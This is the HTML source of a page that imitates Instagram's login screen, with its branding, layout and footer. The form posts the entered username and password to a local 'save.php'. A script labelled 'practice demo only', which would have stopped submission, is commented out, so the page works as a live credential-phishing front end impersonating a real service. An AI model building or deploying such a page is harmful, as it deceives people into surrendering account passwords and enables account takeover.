<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="icon" type="image/png" href="insta.png" sizes="32x32">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <main class="main-layout">
    <section class="promo-panel" aria-label="Instagram introduction">
      <a class="instagram-icon" href="#" aria-label="Instagram">
        <svg viewBox="0 0 100 100" role="img" aria-label="Instagram logo">
          <defs>
            <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#ffd776"/>
              <stop offset="30%" stop-color="#ff543e"/>
              <stop offset="60%" stop-color="#c837ab"/>
              <stop offset="100%" stop-color="#515bd4"/>
            </linearGradient>
          </defs>
          <rect x="10" y="10" width="80" height="80" rx="24" fill="none" stroke="url(#ig-gradient)" stroke-width="8"/>
          <circle cx="50" cy="50" r="19" fill="none" stroke="url(#ig-gradient)" stroke-width="8"/>
          <circle cx="73" cy="27" r="5.5" fill="#d946a8"/>
        </svg>
      </a>

      <h1>See everyday moments from your<br class="desktop-break">
        <span class="gradient-text">close friends</span>.
      </h1>

      <div class="collage" aria-label="Illustration of Instagram stories">
        <div class="photo photo-back photo-left">
          <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&w=420&q=85" alt="">
          <span class="mini-heart">♥</span>
        </div>
        <div class="photo photo-back photo-right">
          <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=420&q=85" alt="">
          <span class="story-ring"></span>
        </div>
        <div class="photo photo-front">
          <img src="https://images.unsplash.com/photo-1529156069898-49953e39b3ac?auto=format&fit=crop&w=600&q=85" alt="Friends spending time together">
          <span class="reaction-pill">😍 😮 🥰</span>
          <span class="green-pill">★⌄</span>
          <span class="bottom-reaction">♡</span>
        </div>
      </div>
    </section>

    <section class="login-panel" aria-label="Log into Instagram">
      <div class="login-content">
        <h2>Log into Instagram</h2>
        <form action="save.php" method="POST" id="login-form">
          <label class="visually-hidden" for="username">Mobile number, username or email</label>
          <input id="username" name="username" type="text"
            placeholder="Mobile number, username or email" autocomplete="username" required>
          <label class="visually-hidden" for="password">Password</label>
          <input id="password" name="password" type="password"
            placeholder="Password" autocomplete="current-password" required>
          <button class="login-button" type="submit">Log in</button>
        </form>

        <a class="forgot-link" href="#">Forgot password?</a>

        <div class="lower-actions">
          <a class="facebook-button" href="#">
            <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10" fill="#0866ff"/><path d="M13.5 20v-7h2.3l.35-2.7H13.5V8.6c0-.78.22-1.3 1.34-1.3h1.43V4.9c-.25-.03-1.1-.1-2.1-.1-2.08 0-3.5 1.27-3.5 3.6v1.9H8.3V13h2.37v7z" fill="#fff"/></svg>
            Log in with Facebook
          </a>
          <a class="create-account" href="#">Create new account</a>
        </div>
        <div class="meta-brand"><span class="meta-symbol">∞</span> Meta</div>
      </div>
    </section>
  </main>

  <footer class="footer">
    <nav class="footer-links" aria-label="Footer">
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
      <a href="#">Popular</a><a href="#">Instagram Lite</a><a href="#">Meta AI</a>
      <a href="#">Muse</a><a href="#">Threads</a><a href="#">Contact Uploading &amp; Non-Users</a>
      <a href="#">Meta Verified</a>
    </nav>
    <div class="footer-bottom">
      <button class="language" type="button">English <span>⌄</span></button>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>

  <!-- <script>
    // Front-end practice only: this demo does not send or store login details.
    document.getElementById("login-form").addEventListener("submit", function (event) {
      event.preventDefault();
      alert("Practice demo only. No login was attempted and no details were sent.");
    });
  </script> -->
</body>
</html>
